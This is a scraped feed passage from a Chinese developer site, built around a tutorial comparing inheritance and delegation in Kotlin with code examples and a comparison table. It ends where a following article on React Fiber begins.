<p><strong>更多文章请关注我的公众号《懒惰蜗牛工坊》</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin中的继承和委托]]></title>    <link>https://juejin.cn/post/7575757258833084442</link>    <guid>https://juejin.cn/post/7575757258833084442</guid>    <pubDate>2025-11-24T03:15:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833084442" data-draft-id="7575757258833035290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin中的继承和委托"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:15:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南雨北斗"/> <meta itemprop="url" content="https://juejin.cn/user/4059818590476286"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin中的继承和委托
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4059818590476286/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南雨北斗
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:15:04.000Z" title="Mon Nov 24 2025 03:15:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Kotlin 中，<strong>继承（Inheritance）</strong>  和 <strong>委托（Delegation）</strong>  是两种核心的代码复用与扩展机制，二者设计目标不同：继承侧重「类的层级关系与功能继承」，委托侧重「复用已有实现、避免继承耦合」。下面结合语法、场景、区别详细说明：</p>
<h2 data-id="heading-0">一、继承（Inheritance）</h2>
<p>继承的核心是「子类拥有父类的属性和方法」，遵循 <strong>单一继承原则</strong>（一个类只能有一个直接父类），通过 <code>:</code> 语法实现。</p>
<h3 data-id="heading-1">1. 核心语法与规则</h3>
<ul>
<li>父类需用 <code>open</code> 标记（默认 <code>final</code>，不可继承）；</li>
<li>子类用 <code>:</code> 继承父类，需传递父类构造参数；</li>
<li>重写父类方法 / 属性需用 <code>override</code> 关键字（父类成员需 <code>open</code>）。</li>
</ul>
<h3 data-id="heading-2">2. 示例：类的继承</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 开放父类（允许继承）</span>
<span class="hljs-keyword">open</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-keyword">val</span> name: String) {
    <span class="hljs-keyword">open</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 在进食"</span>)
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">breathe</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 在呼吸"</span>) <span class="hljs-comment">// 非 open 方法，不可重写</span>
    }
}

<span class="hljs-comment">// 子类继承父类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(name: String) : Animal(name) {
    <span class="hljs-comment">// 重写父类的 open 方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 在吃骨头"</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> dog = Dog(<span class="hljs-string">"旺财"</span>)
    dog.eat()      <span class="hljs-comment">// 输出：旺财 在吃骨头（重写后的方法）</span>
    dog.breathe()  <span class="hljs-comment">// 输出：旺财 在呼吸（继承的父类方法）</span>
    println(dog.name) <span class="hljs-comment">// 输出：旺财（继承的父类属性）</span>
}
</code></pre>
<h3 data-id="heading-3">3. 继承的核心特点</h3>
<ul>
<li><strong>is-a 关系</strong>：子类是父类的一种（如 <code>Dog</code> 是 <code>Animal</code> 的一种），语义强耦合；</li>
<li><strong>功能复用</strong>：直接继承父类的非 <code>final</code> 成员，子类可重写扩展；</li>
<li><strong>限制</strong>：单一继承（只能有一个直接父类），易造成类层级臃肿（如多层继承）。</li>
</ul>
<h2 data-id="heading-4">二、委托（Delegation）</h2>
<p>委托的核心是「将类的部分功能委托给另一个类实现」，通过 <code>by</code> 关键字语法糖实现，本质是「组合优于继承」设计原则的体现。</p>
<p>Kotlin 原生支持委托，无需手动编写转发代码（编译器自动生成），分为 <strong>类委托</strong> 和 <strong>属性委托</strong> 两类，核心是「类委托」（复用类功能）。</p>
<h3 data-id="heading-5">1. 类委托（核心场景）</h3>
<h4 data-id="heading-6">语法：<code>class 子类 : 接口 by 委托实例</code></h4>
<ul>
<li>子类实现某个接口，将接口的所有方法委托给一个「委托实例」；</li>
<li>子类可选择性重写接口方法（覆盖委托的实现）。</li>
</ul>
<h4 data-id="heading-7">示例：类委托复用功能</h4>
<p>需求：实现一个「日志集合」，复用 <code>ArrayList</code> 的存储功能，同时在添加 / 删除元素时打印日志。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 定义接口（明确要委托的功能）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyCollection</span>&lt;<span class="hljs-type">T</span>&gt; {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span>
}

<span class="hljs-comment">// 2. 委托类（已有实现，需复用）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArrayList</span>&lt;<span class="hljs-type">T</span>&gt; : <span class="hljs-type">MyCollection</span>&lt;<span class="hljs-type">T</span>&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> list = ArrayList&lt;T&gt;()

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> list.add(element)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> list.remove(element)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> list.size
    }
}

<span class="hljs-comment">// 3. 目标类：通过委托复用 MyArrayList 的实现，添加日志功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCollection</span>&lt;<span class="hljs-type">T</span>&gt; : <span class="hljs-type">MyCollection</span>&lt;<span class="hljs-type">T</span>&gt; <span class="hljs-title">by</span> <span class="hljs-title">MyArrayList</span>&lt;<span class="hljs-type">T</span>&gt;() {
    <span class="hljs-comment">// 选择性重写 add 方法（覆盖委托的实现，添加日志）</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        println(<span class="hljs-string">"添加元素：<span class="hljs-variable">$element</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.add(element) <span class="hljs-comment">// 调用委托类的 add 方法（MyArrayList 的实现）</span>
    }

    <span class="hljs-comment">// 选择性重写 remove 方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        println(<span class="hljs-string">"删除元素：<span class="hljs-variable">$element</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.remove(element)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> collection = LogCollection&lt;String&gt;()
    collection.add(<span class="hljs-string">"Kotlin"</span>) <span class="hljs-comment">// 输出：添加元素：Kotlin</span>
    collection.add(<span class="hljs-string">"Java"</span>)   <span class="hljs-comment">// 输出：添加元素：Java</span>
    println(<span class="hljs-string">"集合大小：<span class="hljs-subst">${collection.size()}</span>"</span>) <span class="hljs-comment">// 输出：集合大小：2（复用委托的 size 方法）</span>
    collection.remove(<span class="hljs-string">"Java"</span>) <span class="hljs-comment">// 输出：删除元素：Java</span>
}
</code></pre>
<h4 data-id="heading-8">关键说明：</h4>
<ul>
<li><code>LogCollection</code> 实现 <code>MyCollection</code> 接口，但未手动实现 <code>add/remove/size</code> 方法，而是通过 <code>by MyArrayList&lt;T&gt;()</code> 将这些方法委托给 <code>MyArrayList</code> 实例；</li>
<li>子类可重写接口方法，此时优先执行子类的实现（如 <code>add</code> 方法的日志逻辑），再通过 <code>super.add(element)</code> 调用委托类的原实现；</li>
<li>委托是「has-a 关系」（<code>LogCollection</code> 包含 <code>MyArrayList</code> 实例），语义耦合弱，灵活性高。</li>
</ul>
<h3 data-id="heading-9">2. 属性委托（补充场景）</h3>
<p>属性委托是「将属性的 getter/setter 逻辑委托给另一个类」，语法：<code>val/var 属性名: 类型 by 委托实例</code>，常用于复用属性逻辑（如延迟初始化、观察属性变化）。</p>
<p>示例：延迟初始化（<code>lazy</code> 是 Kotlin 内置的属性委托）</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 延迟初始化：只有第一次访问时才执行初始化逻辑</span>
<span class="hljs-keyword">val</span> expensiveData: String <span class="hljs-keyword">by</span> lazy {
    println(<span class="hljs-string">"初始化数据（耗时操作）"</span>)
    <span class="hljs-string">"耗时计算后的结果"</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"开始访问数据"</span>)
    println(expensiveData) <span class="hljs-comment">// 输出：初始化数据（耗时操作）→ 耗时计算后的结果</span>
    println(expensiveData) <span class="hljs-comment">// 输出：耗时计算后的结果（直接复用已初始化的值）</span>
}
</code></pre>
<h3 data-id="heading-10">3. 委托的核心特点</h3>
<ul>
<li><strong>has-a 关系</strong>：目标类包含委托实例，语义耦合弱（可灵活替换委托对象）；</li>
<li><strong>多委托支持</strong>：一个类可实现多个接口，每个接口委托给不同实例（间接实现 “多继承” 效果，无单一继承限制）；</li>
<li><strong>解耦</strong>：避免继承带来的类层级臃肿，复用已有实现而不依赖父类层级；</li>
<li><strong>灵活扩展</strong>：可选择性覆盖委托的方法，保留核心复用，扩展额外逻辑。</li>
</ul>
<h2 data-id="heading-11">三、继承 vs 委托：核心区别与选择场景</h2>








































<table><thead><tr><th>维度</th><th>继承（Inheritance）</th><th>委托（Delegation）</th></tr></thead><tbody><tr><td>语义关系</td><td>is-a（子类是父类的一种）</td><td>has-a（目标类包含委托实例）</td></tr><tr><td>耦合程度</td><td>强耦合（子类依赖父类实现）</td><td>弱耦合（仅依赖接口，可替换委托）</td></tr><tr><td>继承限制</td><td>单一继承（只能有一个直接父类）</td><td>支持多委托（多个接口可委托给不同实例）</td></tr><tr><td>类层级影响</td><td>易造成层级臃肿（多层继承）</td><td>不影响类层级（扁平化设计）</td></tr><tr><td>功能复用方式</td><td>继承父类所有非 final 成员</td><td>复用委托类的接口实现，可选择性覆盖</td></tr><tr><td>灵活性</td><td>低（父类变更可能影响子类）</td><td>高（可动态替换委托实例，扩展逻辑）</td></tr></tbody></table>
<h3 data-id="heading-12">选择原则：</h3>
<ol>
<li>
<p>用 <strong>继承</strong> 的场景：</p>
<ul>
<li>子类与父类存在明确的「is-a」关系（如 <code>Dog</code> 是 <code>Animal</code>）；</li>
<li>需要复用父类的大部分功能，且子类需融入父类的类层级（如多态场景）。</li>
</ul>
</li>
<li>
<p>用 <strong>委托</strong> 的场景：</p>
<ul>
<li>仅需复用某个类的部分功能（而非全部）；</li>
<li>避免单一继承限制（需整合多个类的功能）；</li>
<li>希望降低耦合，允许灵活替换实现（如切换不同的存储方案、日志方案）；</li>
<li>类层级已复杂，不想再增加继承深度。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-13">四、进阶：委托实现 “多继承” 效果</h2>
<p>由于 Kotlin 禁止类的多继承，但委托支持多接口委托，可间接实现 “多继承” 的功能整合：</p>
<p>示例：一个类整合两个不同类的功能</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 接口1：飞行功能</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fly</span><span class="hljs-params">()</span></span>
}

<span class="hljs-comment">// 接口2：游泳功能</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Swimmable</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">swim</span><span class="hljs-params">()</span></span>
}

<span class="hljs-comment">// 委托类1：实现飞行功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> : <span class="hljs-type">Flyable</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fly</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"鸟类飞行"</span>)
    }
}

<span class="hljs-comment">// 委托类2：实现游泳功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Fish</span> : <span class="hljs-type">Swimmable</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">swim</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"鱼类游泳"</span>)
    }
}

<span class="hljs-comment">// 目标类：通过多委托整合飞行和游泳功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span> : <span class="hljs-type">Flyable</span> <span class="hljs-title">by</span> <span class="hljs-title">Bird</span>(), Swimmable <span class="hljs-keyword">by</span> Fish() {
    <span class="hljs-comment">// 可选：覆盖委托的方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fly</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"鸭子低空飞行（覆盖鸟类飞行）"</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> duck = Duck()
    duck.fly()  <span class="hljs-comment">// 输出：鸭子低空飞行（覆盖鸟类飞行）</span>
    duck.swim() <span class="hljs-comment">// 输出：鱼类游泳（复用鱼类的实现）</span>
}
</code></pre>
<p>这里 <code>Duck</code> 同时整合了 <code>Bird</code> 的飞行功能和 <code>Fish</code> 的游泳功能，且无需继承这两个类，避免了多继承的问题。</p>
<h2 data-id="heading-14">五、核心总结</h2>
<ol>
<li>继承是「强耦合的层级关系」，适合 <code>is-a</code> 场景，遵循单一继承；</li>
<li>委托是「弱耦合的功能复用」，适合 <code>has-a</code> 场景，支持多委托，灵活性更高；</li>
<li>Kotlin 推荐「组合（委托）优于继承」，减少类层级臃肿，提升代码可维护性；</li>
<li>需整合多个类的功能时，用「接口 + 多委托」替代多继承（避免歧义与耦合）。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从Demo理解Fiber]]></title>    <link>https://juejin.cn/post/7575413146923073551</link>    <guid>https://juejin.cn/post/7575413146923073551</guid>    <pubDate>2025-11-24T03:24:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575413146923073551" data-draft-id="7575742632333623346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从Demo理解Fiber"/> <meta itemprop="keywords" content="React.js"/> <meta itemprop="datePublished" content="2025-11-24T03:24:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="古茗前端团队"/> <meta itemprop="url" content="https://juejin.cn/user/3233040624266695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从Demo理解Fiber
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/7198439419173404711/posts" data-v-d326b38e=""><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dafcebf7c91d402abd52f072a32deba8~tplv-k3u1fbpfcp-watermark.image?" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/7198439419173404711/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="古茗前端团队" class="title" data-v-d326b38e="">古茗前端团队</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-11-24T03:24:39.000Z" title="Mon Nov 24 2025 03:24:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-11-24
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                阅读1分钟
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        关注
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              @古茗科技
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body 